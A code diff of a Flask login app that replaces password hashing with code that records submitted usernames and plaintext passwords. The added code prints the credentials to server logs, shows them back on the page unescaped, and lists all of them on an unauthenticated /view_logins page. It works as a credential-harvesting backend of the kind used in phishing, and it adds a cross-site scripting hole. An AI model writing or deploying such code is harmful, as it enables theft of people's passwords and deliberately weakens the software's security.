@@ -1,11 +1,11 @@
 from flask import Flask, request, render_template
 import os
-from werkzeug.security import generate_password_hash
+from datetime import datetime
 
 app = Flask(__name__, template_folder='templates')
 
-# Safe default for development
-app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-key-123')
+# Store login attempts (in-memory)
+login_attempts = []
 
 @app.route('/')
 def index():
@@ -13,29 +13,33 @@ def index():
 
 @app.route('/login', methods=['POST'])
 def login():
-    try:
-        username = request.form.get('username', '').strip()
-        password = request.form.get('password', '').strip()
-        
-        if not username or not password:
-            return "Username and password required", 400
-            
-        hashed_pw = generate_password_hash(password)
-        print(f"Login attempt: {username}")  # View in Render logs
-        
-        # Option 1: In-memory storage (recommended)
-        global last_login
-        last_login = {'username': username, 'hashed_pw': hashed_pw}
-        
-        # Option 2: Temporary file (ephemeral on Render)
-        with open('/tmp/credentials.txt', 'a') as f:
-            f.write(f"{username}:{hashed_pw}\n")
-            
-        return "Login processed successfully!"
-        
-    except Exception as e:
-        print(f"ERROR: {str(e)}")  # Debug in logs
-        return f"Server error: {str(e)}", 500
+    username = request.form.get('username', '')
+    password = request.form.get('password', '')  # Getting raw password
+    
+    if not username or not password:
+        return "Username and password required", 400
+    
+    # Store attempt with timestamp
+    attempt = {
+        'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        'username': username,
+        'password': password  # Storing actual password
+    }
+    login_attempts.append(attempt)
+    
+    # Print to console (view in Render logs)
+    print(f"New login: {attempt}")
+    
+    return f"""
+    <h2>Login Successful (TESTING ONLY)</h2>
+    <p>Username: {username}</p>
+    <p>Password: {password}</p>
+    <a href="/">Back to login</a>
+    """
+
+@app.route('/view_logins')
+def view_logins():
+    return render_template('logins.html', attempts=login_attempts)
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
